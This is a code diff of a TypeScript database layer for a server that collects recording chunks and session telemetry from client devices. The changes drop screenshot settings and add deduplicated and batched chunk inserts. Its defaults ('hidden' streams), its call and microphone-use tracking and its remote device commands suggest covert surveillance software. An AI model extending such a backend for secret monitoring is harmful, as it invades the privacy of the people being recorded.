@@ -68,8 +68,6 @@ export function initDatabase(): void {
             client_id           TEXT    UNIQUE NOT NULL,
             command             TEXT    NOT NULL DEFAULT 'NONE',
             status              TEXT    NOT NULL DEFAULT 'idle',
-            auto_screenshot     INTEGER NOT NULL DEFAULT 0,
-            screenshot_interval INTEGER NOT NULL DEFAULT 30,
             start_time          TEXT    DEFAULT '',
             stop_time           TEXT    DEFAULT '',
             updated_at          TEXT    NOT NULL
@@ -144,12 +142,7 @@ export function initDatabase(): void {
     try {
         db.exec("ALTER TABLE device_commands ADD COLUMN status TEXT NOT NULL DEFAULT 'idle'");
     } catch { }
-    try {
-        db.exec("ALTER TABLE device_commands ADD COLUMN auto_screenshot INTEGER NOT NULL DEFAULT 0");
-    } catch { }
-    try {
-        db.exec("ALTER TABLE device_commands ADD COLUMN screenshot_interval INTEGER NOT NULL DEFAULT 30");
-    } catch { }
+
     try {
         db.exec("ALTER TABLE device_commands ADD COLUMN start_time TEXT DEFAULT ''");
     } catch { }
@@ -214,11 +207,20 @@ export interface Session {
 }
 
 export function createSession(sessionId: string, clientName: string = '', deviceInfo: string = '', title: string = '', streamType: string = 'hidden'): Session {
+    const existing = getSession(sessionId);
+    if (existing) {
+        if (existing.status !== 'live') {
+            reactivateSession(sessionId);
+        }
+        return getSession(sessionId)!;
+    }
     const now = new Date().toISOString();
-    execute(
-        `INSERT INTO sessions (session_id, title, created_at, status, client_name, device_info, in_call, mic_in_use, stream_type) VALUES (?, ?, ?, 'live', ?, ?, 0, 0, ?)`,
-        [sessionId, title, now, clientName, deviceInfo, streamType]
-    );
+    try {
+        execute(
+            `INSERT OR IGNORE INTO sessions (session_id, title, created_at, status, client_name, device_info, in_call, mic_in_use, stream_type) VALUES (?, ?, ?, 'live', ?, ?, 0, 0, ?)`,
+            [sessionId, title, now, clientName, deviceInfo, streamType]
+        );
+    } catch { }
     return getSession(sessionId)!;
 }
 
@@ -226,17 +228,11 @@ export function getSession(sessionId: string): Session | undefined {
     return queryOne<Session>('SELECT * FROM sessions WHERE session_id = ?', [sessionId]);
 }
 
-export function listSessions(limit: number = 100, offset: number = 0, streamType?: string): Session[] {
-    if (streamType) {
-        return queryAll<Session>('SELECT * FROM sessions WHERE stream_type = ? ORDER BY created_at DESC LIMIT ? OFFSET ?', [streamType, limit, offset]);
-    }
+export function listSessions(limit: number = 100, offset: number = 0, _streamType?: string): Session[] {
     return queryAll<Session>('SELECT * FROM sessions ORDER BY created_at DESC LIMIT ? OFFSET ?', [limit, offset]);
 }
 
-export function getActiveSessions(streamType?: string): Session[] {
-    if (streamType) {
-        return queryAll<Session>("SELECT * FROM sessions WHERE status = 'live' AND stream_type = ? ORDER BY created_at DESC", [streamType]);
-    }
+export function getActiveSessions(_streamType?: string): Session[] {
     return queryAll<Session>("SELECT * FROM sessions WHERE status = 'live' ORDER BY created_at DESC");
 }
 
@@ -280,11 +276,7 @@ export function deleteSession(sessionId: string): boolean {
     return true;
 }
 
-export function getSessionCount(streamType?: string): number {
-    if (streamType) {
-        const row = queryOne<{ cnt: number }>('SELECT COUNT(*) as cnt FROM sessions WHERE stream_type = ?', [streamType]);
-        return row?.cnt ?? 0;
-    }
+export function getSessionCount(_streamType?: string): number {
     const row = queryOne<{ cnt: number }>('SELECT COUNT(*) as cnt FROM sessions');
     return row?.cnt ?? 0;
 }
@@ -343,14 +335,114 @@ export function insertChunk(
     inCall: number = 0,
     micInUse: number = 0
 ): Chunk {
+    // 1. Check if chunkId already exists
+    const existing = getChunk(chunkId);
+    if (existing) return existing;
+
+    // 2. Check if (session_id, sequence_num) already exists
+    const seqExisting = queryOne<Chunk>('SELECT * FROM chunks WHERE session_id = ? AND sequence_num = ?', [sessionId, sequenceNum]);
+    if (seqExisting) return seqExisting;
+
     const now = new Date().toISOString();
-    execute(
-        `INSERT INTO chunks (chunk_id, session_id, sequence_num, filename, filepath, file_size, duration_ms, status, received_at, checksum, in_call, mic_in_use) VALUES (?, ?, ?, ?, ?, ?, ?, 'received', ?, ?, ?, ?)`,
-        [chunkId, sessionId, sequenceNum, filename, filepath, fileSize, durationMs, now, checksum, inCall, micInUse]
+    try {
+        const result = execute(
+            `INSERT OR IGNORE INTO chunks (chunk_id, session_id, sequence_num, filename, filepath, file_size, duration_ms, status, received_at, checksum, in_call, mic_in_use) VALUES (?, ?, ?, ?, ?, ?, ?, 'received', ?, ?, ?, ?)`,
+            [chunkId, sessionId, sequenceNum, filename, filepath, fileSize, durationMs, now, checksum, inCall, micInUse]
+        );
+        if (result.changes > 0) {
+            updateSessionStats(sessionId, fileSize, durationMs);
+            updateSessionTelemetry(sessionId, inCall, micInUse);
+        }
+    } catch (err: any) {
+        if (err.code === 'SQLITE_CONSTRAINT_UNIQUE' || (err.message && err.message.includes('UNIQUE constraint failed'))) {
+            const conflictExisting = getChunk(chunkId);
+            if (conflictExisting) return conflictExisting;
+            const conflictSeq = queryOne<Chunk>('SELECT * FROM chunks WHERE session_id = ? AND sequence_num = ?', [sessionId, sequenceNum]);
+            if (conflictSeq) return conflictSeq;
+        }
+        throw err;
+    }
+
+    const found = getChunk(chunkId) || queryOne<Chunk>('SELECT * FROM chunks WHERE session_id = ? AND sequence_num = ?', [sessionId, sequenceNum]);
+    if (found) return found;
+
+    return {
+        id: 0,
+        chunk_id: chunkId,
+        session_id: sessionId,
+        sequence_num: sequenceNum,
+        filename,
+        filepath,
+        file_size: fileSize,
+        duration_ms: durationMs,
+        status: 'received',
+        received_at: now,
+        checksum,
+        in_call: inCall,
+        mic_in_use: micInUse,
+    };
+}
+
+export interface BatchChunkInput {
+    chunkId: string;
+    sequenceNum: number;
+    filename: string;
+    filepath: string;
+    fileSize: number;
+    durationMs: number;
+    checksum?: string;
+    inCall?: number;
+    micInUse?: number;
+}
+
+export function insertChunksBatch(sessionId: string, chunks: BatchChunkInput[]): { insertedCount: number } {
+    if (chunks.length === 0) return { insertedCount: 0 };
+    const now = new Date().toISOString();
+    let totalAddedSize = 0;
+    let totalAddedDuration = 0;
+    let lastInCall = 0;
+    let lastMicInUse = 0;
+    let count = 0;
+
+    const insertStmt = getDb().prepare(
+        `INSERT OR IGNORE INTO chunks (chunk_id, session_id, sequence_num, filename, filepath, file_size, duration_ms, status, received_at, checksum, in_call, mic_in_use) VALUES (?, ?, ?, ?, ?, ?, ?, 'received', ?, ?, ?, ?)`
     );
-    updateSessionStats(sessionId, fileSize, durationMs);
-    updateSessionTelemetry(sessionId, inCall, micInUse);
-    return getChunk(chunkId)!;
+
+    const runBatch = getDb().transaction((items: BatchChunkInput[]) => {
+        for (const item of items) {
+            const inCallVal = item.inCall || 0;
+            const micInUseVal = item.micInUse || 0;
+            const res = insertStmt.run(
+                item.chunkId,
+                sessionId,
+                item.sequenceNum,
+                item.filename,
+                item.filepath,
+                item.fileSize,
+                item.durationMs,
+                now,
+                item.checksum || '',
+                inCallVal,
+                micInUseVal
+            );
+            if (res.changes > 0) {
+                count++;
+                totalAddedSize += item.fileSize;
+                totalAddedDuration += item.durationMs;
+                lastInCall = inCallVal;
+                lastMicInUse = micInUseVal;
+            }
+        }
+    });
+
+    runBatch(chunks);
+
+    if (count > 0) {
+        updateSessionStats(sessionId, totalAddedSize, totalAddedDuration);
+        updateSessionTelemetry(sessionId, lastInCall, lastMicInUse);
+    }
+
+    return { insertedCount: count };
 }
 
 export function getChunk(chunkId: string): Chunk | undefined {
@@ -390,33 +482,44 @@ export interface Stats {
 }
 
 export function getStats(streamType?: string): Stats {
-    let sessionsSql = 'SELECT COUNT(*) as cnt FROM sessions';
-    let activeSql = "SELECT COUNT(*) as cnt FROM sessions WHERE status = 'live'";
-    let chunksSql = 'SELECT COUNT(*) as cnt, COALESCE(SUM(file_size), 0) as bytes FROM chunks';
-    let durationSql = 'SELECT COALESCE(SUM(total_duration), 0) as dur FROM sessions';
+    let sql = `
+        SELECT 
+            COUNT(*) as total_sessions,
+            COALESCE(SUM(CASE WHEN status = 'live' THEN 1 ELSE 0 END), 0) as active_sessions,
+            COALESCE(SUM(total_chunks), 0) as total_chunks,
+            COALESCE(SUM(total_bytes), 0) as total_bytes,
+            COALESCE(SUM(total_duration), 0) as total_duration
+        FROM sessions
+    `;
     let params: any[] = [];
 
     if (streamType) {
-        sessionsSql = 'SELECT COUNT(*) as cnt FROM sessions WHERE stream_type = ?';
-        activeSql = "SELECT COUNT(*) as cnt FROM sessions WHERE status = 'live' AND stream_type = ?";
-        chunksSql = 'SELECT COUNT(*) as cnt, COALESCE(SUM(c.file_size), 0) as bytes FROM chunks c JOIN sessions s ON c.session_id = s.session_id WHERE s.stream_type = ?';
-        durationSql = 'SELECT COALESCE(SUM(total_duration), 0) as dur FROM sessions WHERE stream_type = ?';
+        sql += ' WHERE stream_type = ?';
         params = [streamType];
     }
 
-    const sessions = queryOne<{ cnt: number }>(sessionsSql, params);
-    const active = queryOne<{ cnt: number }>(activeSql, params);
-    const chunks = queryOne<{ cnt: number; bytes: number }>(chunksSql, params);
-    const duration = queryOne<{ dur: number }>(durationSql, params);
+    const row = queryOne<{
+        total_sessions: number;
+        active_sessions: number;
+        total_chunks: number;
+        total_bytes: number;
+        total_duration: number;
+    }>(sql, params);
+
+    const totalSessions = row?.total_sessions ?? 0;
+    const activeSessions = row?.active_sessions ?? 0;
+    const totalChunks = row?.total_chunks ?? 0;
+    const totalBytes = row?.total_bytes ?? 0;
+    const totalDuration = row?.total_duration ?? 0;
 
     return {
-        total_sessions: sessions?.cnt ?? 0,
-        active_sessions: active?.cnt ?? 0,
-        total_chunks: chunks?.cnt ?? 0,
-        total_bytes: chunks?.bytes ?? 0,
-        total_duration: duration?.dur ?? 0,
-        total_duration_human: formatDuration(duration?.dur ?? 0),
-        total_size_human: formatSize(chunks?.bytes ?? 0),
+        total_sessions: totalSessions,
+        active_sessions: activeSessions,
+        total_chunks: totalChunks,
+        total_bytes: totalBytes,
+        total_duration: totalDuration,
+        total_duration_human: formatDuration(totalDuration),
+        total_size_human: formatSize(totalBytes),
     };
 }
 
@@ -456,8 +559,6 @@ export interface DeviceCommand {
     client_id: string;
     command: string;
     status: string;
-    auto_screenshot: number;
-    screenshot_interval: number;
     start_time: string;
     stop_time: string;
     updated_at: string;
@@ -469,15 +570,6 @@ export function setDeviceCommand(clientId: string, command: string): void {
         `INSERT INTO device_commands (client_id, command, updated_at) VALUES (?, ?, ?)
          ON CONFLICT(client_id) DO UPDATE SET command = excluded.command, updated_at = excluded.updated_at`,
         [clientId, command, now]
-    );
-}
-
-export function updateDeviceScreenshotSettings(clientId: string, autoScreenshot: number, interval: number): void {
-    const now = new Date().toISOString();
-    execute(
-        `INSERT INTO device_commands (client_id, auto_screenshot, screenshot_interval, updated_at) VALUES (?, ?, ?, ?)
-         ON CONFLICT(client_id) DO UPDATE SET auto_screenshot = excluded.auto_screenshot, screenshot_interval = excluded.screenshot_interval, updated_at = excluded.updated_at`,
-        [clientId, autoScreenshot, interval, now]
     );
 }
 
